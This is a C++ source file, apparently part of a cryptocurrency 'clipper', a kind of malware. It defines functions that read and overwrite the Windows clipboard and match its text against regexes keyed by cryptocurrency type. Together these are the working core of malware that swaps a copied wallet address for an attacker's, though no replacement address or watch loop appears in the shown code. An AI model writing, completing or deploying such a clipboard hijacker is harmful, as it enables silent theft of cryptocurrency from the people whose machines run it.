#include "clipper.h"

static std::string utf8_from_wstring(const std::wstring& w)
{
    if (w.empty()) return std::string{};
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(size_needed, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), size_needed, nullptr, nullptr);
    return out;
}

static std::wstring wstring_from_utf8(const std::string& s)
{
    if (s.empty()) return std::wstring{};
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), nullptr, 0);
    std::wstring out(size_needed, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.data(), (int)s.size(), out.data(), size_needed);
    return out;
}

std::string clipper::get_clipboard_text()
{
    if (!OpenClipboard(nullptr))
        return std::string();

    std::string result;

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != nullptr)
    {
        LPCWSTR pwsz = static_cast<LPCWSTR>(GlobalLock(hData));
        if (pwsz != nullptr)
        {
            std::wstring w(pwsz);
            result = utf8_from_wstring(w);
            GlobalUnlock(hData);
            CloseClipboard();
            return result;
        }
    }

    hData = GetClipboardData(CF_TEXT);
    if (hData != nullptr)
    {
        LPCSTR psz = static_cast<LPCSTR>(GlobalLock(hData));
        if (psz != nullptr)
        {
            result = std::string(psz);
            GlobalUnlock(hData);
        }
    }

    CloseClipboard();
    return result;
}

bool clipper::set_clipboard_text(const std::string& text)
{
    if (!OpenClipboard(nullptr))
        return false;

    if (!EmptyClipboard())
    {
        CloseClipboard();
        return false;
    }

    std::wstring wtext = wstring_from_utf8(text);
    SIZE_T bytes = (wtext.size() + 1) * sizeof(wchar_t);

    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, bytes);
    if (hGlob == nullptr)
    {
        CloseClipboard();
        return false;
    }

    void* pData = GlobalLock(hGlob);
    if (pData == nullptr)
    {
        GlobalFree(hGlob);
        CloseClipboard();
        return false;
    }

    memcpy(pData, wtext.c_str(), bytes);
    GlobalUnlock(hGlob);

    if (SetClipboardData(CF_UNICODETEXT, hGlob) == nullptr)
    {
        GlobalFree(hGlob);
        CloseClipboard();
        return false;
    }

    CloseClipboard();
    return true;
}

crypto_type clipper::matches_regex(const std::string& input, const std::vector<std::pair<crypto_type, std::regex>>& crypto_regexes)
{
    for (const auto& pr : crypto_regexes)
    {
        const crypto_type type = pr.first;
        const std::regex& rx = pr.second;
        if (std::regex_match(input, rx))
            return type;
    }
    return none;
}